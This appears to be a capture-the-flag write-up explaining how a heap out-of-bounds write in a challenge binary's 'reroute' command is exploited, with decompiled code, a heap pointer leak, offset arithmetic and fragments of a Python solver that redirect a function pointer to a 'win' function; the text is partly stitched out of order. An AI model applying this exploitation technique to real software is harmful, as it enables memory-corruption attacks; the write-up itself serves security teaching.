>
>The core bug is here:
>

>piVar21 = (int *)(lVar30 + (long)iVar25 * 8);

>- `idx < route_len`
>- `idx < allocated_entries`

>- attacker controls `idx`
>- `idx` is used directly in pointer arithmetic
>- resulting pointer is written to
>- no validation happens first
>
>So `reroute` gives an **out-of-bounds write primitive** relative to the heap buffer inside the order object.
>

>### Practical takeaway
>
>`reroute` is the strongest primitive so far because it lets us write relative to a heap buffer reachable through the order object.
>
>What we get:
>- base pointer comes from the heap object created in `add_order`
>- index comes from the **second** `reroute` argument
>- upper 4 bytes come from the **third** `reroute` argument
>- lower 4 bytes come from the original `add_order(x, y)` coordinates
>
>So the primitive is:
>
>```c
>target = heap_base + idx * 8
>write_4(target + 0, y*G + x)
>write_4(target + 4, reroute_arg3)
>```
>
>Main issue:
>- **no bounds check on `idx`**
>
>Main constraint:
>- if `idx > 1`, code jumps to `LAB_00102015`
>- that path dereferences computed addresses

        if not ch:
            break
        data += ch

    io["w"].flush()
    return read_until_prompt(io)

    try:
        io["w"].write("quit\n")
        io["w"].flush()
    except (BrokenPipeError, OSError):
        pass
    return io["r"].read()


def extract_ptr(pattern, text):
    m = re.search(pattern, text)
    if not m:
        raise RuntimeError(f"failed to find {pattern!r} in output:\n{text}")
    return int(m.group(1), 16)


def run(io):
    read_until_prompt(io)

    print(cmd(io, "add_order 12 1"), end="")

    replay = cmd(io, "replay 0")
    receipt = cmd(io, "receipt 0")
    print(replay, end="")
    print(receipt, end="")

    renderer = extract_ptr(r"hint=(0x[0-9a-fA-F]+)", receipt)

    win = pie_base + 0x2460

    fake_heap = target_addr + 8 * k

>```
>
>Break that carefully:
>
>1. First:
>
>```c
>*(long *)(&DAT_001060a8 + lVar13)
>```
>
>gives the heap object pointer for this order, i.e.:
>
>```text
>puVar14
>```
>
>2. Then the `+ 8` means:
>
>```text
>access the field at offset 0x8 inside puVar14
>```
>
>so this becomes:
>
>```c
>lVar30 = *(long *)(puVar14 + 0x8);
>```
>
>So the `+8` here is **not** another later offset — it is simply the field being read.
>
>---
>
>### Matching that with `add_order`
>
>From `add_order`:
>
>```c
>*(undefined4 **)(&DAT_001060a8 + lVar13 * 0x1038) = puVar14;
>*(undefined4 **)(puVar14 + 2) = puVar14 + 6;
>```
>
>Since `puVar14` is an `undefined4 *`:
>
>```text
>puVar14 + 2 = 2 * 4 = 0x8
>puVar14 + 6 = 6 * 4 = 0x18
>```
>
>So this line:
>
>```c
>*(undefined4 **)(puVar14 + 2) = puVar14 + 6;
>```
>
>means:
>
>```text
>[puVar14 + 0x8] = puVar14 + 0x18
>```
>
>Therefore:
>
>```text
>lVar30 = *(long *)(puVar14 + 0x8) = puVar14 + 0x18
>```
>
>Visualizing the chain:
>
>```text
>DAT_001060a8 + lVar13  ->  puVar14
>puVar14 + 0x8          ->  stored pointer
>stored pointer         ->  lVar30
>```
>
>or more concretely:
>
>```text
>[puVar14 + 0x8] = puVar14 + 0x18
>                      ↓
>                    lVar30
>```
>
>---
>
>### Why this becomes the first target
>
>The key point is:
>
>```text
>reroute does not use puVar14 directly
>reroute uses the pointer stored at [puVar14 + 0x8]
>```
>
>So if we overwrite:
>
>```text
>[puVar14 + 0x8]
>```
>
>then the **next** `reroute` will use our forged value as the new base.
>
>And that forged base must satisfy:
>
>```text
>base % 8 = 4
>```
>
>because then:
>
>```text
>(base + idx * 8) % 8 = 4
>```
>
>which finally makes it possible to land on:
>
>```text
>fx_finish_dummy - 4
>```
>
>---
>
>### Conclusion
>
>So the first `reroute` is not for overwriting `fx_finish_dummy` yet.
>
>Its real job is:
>
>```text
>overwrite [puVar14 + 0x8]
>```
>
>so that the next base used by `reroute` becomes a value with:
>
>```text
>% 8 = 4
>```
>
>That is why we need two `reroute`s:
>
>```text
>first reroute  -> fix the base
>second reroute -> use that base to hit fx_finish_dummy - 4
>```

>[!note]- Step 5 — Building the Forged Base
>From Step 4, we know the first `reroute` must overwrite:
>
>```text
>[puVar14 + 0x8]
>```
>
>because that field becomes:
>
>```c
>lVar30 = *(long *)(puVar14 + 0x8);
>```
>
>And the new value must satisfy:
>
>```text
>base % 8 = 4
>```
>
>---
>
>### How do we control the written value?
>
>Recall how `reroute` writes:
>
>```c
>piVar21 = (int *)(lVar30 + (long)iVar25 * 8);
>
>*piVar21   = order_y * G + order_x;
>piVar21[1] = user_input;
>```
>
>So one `reroute` reconstructs 8 bytes like:
>
>```text
>[0..3] = order_y * G + order_x   // from add_order
>[4..7] = user_input              // from reroute arg3
>```
>
>Meaning:
>
>```text
>low 4 bytes  → controlled via add_order
>high 4 bytes → controlled via reroute arg3
>```
>
>---
>
>### Why we use `add_order 12 1`
>
>This choice is directly tied to how the **low 4 bytes** are produced.
>
>Later, when we overwrite `[puVar14 + 0x8]`, the low dword will be:
>
>```text
>order_y * G + order_x
>```
>
>So we choose:
>
>```python
>add_order 12 1
>```
>
>because:
>
>```text
>order_y * G + order_x
>= 1 * 16 (map width) + 12
>= 28
>= 0x1c
>```
>
>And:
>
>```text
>0x1c % 8 = 4
>```
>
>This gives us exactly the lower 4-byte value needed for the forged base.
>
>---
>
>### Building the full pointer
>
>We do not need to fully control all 8 bytes.
>
>- low 4 bytes → we already get `0x1c`
>- high 4 bytes → we reuse heap-based bytes
>
>We first leak the heap object:
>
>```python
>receipt = cmd(io, "receipt 0")
>renderer = extract_ptr(r"hint=(0x[0-9a-fA-F]+)", receipt)
>```
>
>Here `renderer` is `puVar14`.
>
>So we can construct a new pointer that stays in the same heap region while having the lower bits we want.

>[!note]- Step 6 — The Two `reroute`s
>Before using the solver math, there is one simple but important observation:
>
>the **first** `reroute` reaches the stored base pointer just by walking backward with `idx = -2`.
>
>---
>
>### Recall the initial base
>
>From the earlier setup, `reroute` resolves its base with:
>
>```c
>lVar30 = *(long *)(puVar14 + 0x8);
>```
>
>and initially that field contains:
>
>```text
>[puVar14 + 0x8] = puVar14 + 0x18
>```
>
>So before any corruption:
>
>```text
>lVar30 = puVar14 + 0x18
>```
>
>Then `reroute` writes at:
>
>```c
>piVar21 = (int *)(lVar30 + idx * 8);
>```
>
>---
>
>### Why `reroute 0 -2 ...` hits `[puVar14 + 0x8]`
>
>If:
>
>```text
>lVar30 = puVar14 + 0x18
>```
>
>then choosing:
>
>```text
>idx = -2
>```
>
>gives:
>
>```text
>lVar30 + (-2) * 8
>= puVar14 + 0x18 - 0x10
>= puVar14 + 0x8
>```
>
>So the first `reroute` does not need fancy math to find the field — it naturally lands on:
>
>```text
>[puVar14 + 0x8]
>```
>
>just by using `-2`.
>
>That is why the solver uses:
>
>```python
>reroute 0 -2 {fake_heap_hi}
>```
>
>---
>
>### What the first `reroute` writes there
>
>Recall the write layout:
>
>```c
>*piVar21   = order_y * G + order_x;
>piVar21[1] = user_input;
>```
>
>So this first overwrite rebuilds `[puVar14 + 0x8]` as:
>
>```text
>[ low 4 bytes ] = order_y * G + order_x
>[ high 4 bytes ] = fake_heap_hi
>```
>
>From our earlier `add_order 12 1` choice:
>
>```text
>order_y * G + order_x = 1 * 16 + 12 = 0x1c
>```
>
>So after the first `reroute`, the field becomes:
>
>```text
>[puVar14 + 0x8] = [ 0x1c ][ fake_heap_hi ]
>```
>
>Meaning:
>
>- the **low 4 bytes** come from `add_order`
>- the **high 4 bytes** come from `fake_heap_hi`
>
>And since `fake_heap_hi` is taken from the leaked heap pointer, it is basically still using the correct heap high bytes.
>
>So the new stored base is still a heap pointer, but now its low bits satisfy:
>
>```text
>% 8 = 4
>```
>
>---
>
>### Where solver math starts to matter
>
>After the first `reroute`, the next base is now our forged one:
>
>```text
>lVar30 = fake_heap
>```
>
>Now the solver math is used for the **second** `reroute`:
>
>```python
>node_id = 12 + 16 * 1
>target_addr = renderer + 0x430 - 4
>
>k = ((node_id - (target_addr & 0xFFFFFFFF)) & 0xFFFFFFFF) // 8
>heap_idx = -k
>fake_heap = target_addr + 8 * k
>fake_heap_hi = c_int32((fake_heap >> 32) & 0xFFFFFFFF).value
>```
>
>The purpose of this part is to choose:
>
>- a forged base `fake_heap`
>- and a backward index `heap_idx`
>
>such that:
>
>```text
>fake_heap + heap_idx * 8 = target_addr
>```
>
>with:
>
>```text
>target_addr = puVar14 + 0x430 - 4
>```
>
>So the second `reroute`:
>
>```python
>reroute 0 {heap_idx} {c_int32(win & 0xFFFFFFFF).value}
>```
>
>lands exactly on:
>
>```text
>fx_finish_dummy - 4
>```
>
>and its controlled half overwrites the low 4 bytes of `fx_finish_dummy` with the low 4 bytes of `win`.
>
>---
>
>### Summary
>
>So the two `reroute`s have different roles:
>
>```text
>reroute 0 -2 fake_heap_hi
>```
>
>→ walk backward from the initial base and overwrite `[puVar14 + 0x8]`
>
>```text
>reroute 0 heap_idx low32(win)
>```
>
>→ use the forged base to walk backward again and land on `fx_finish_dummy - 4`
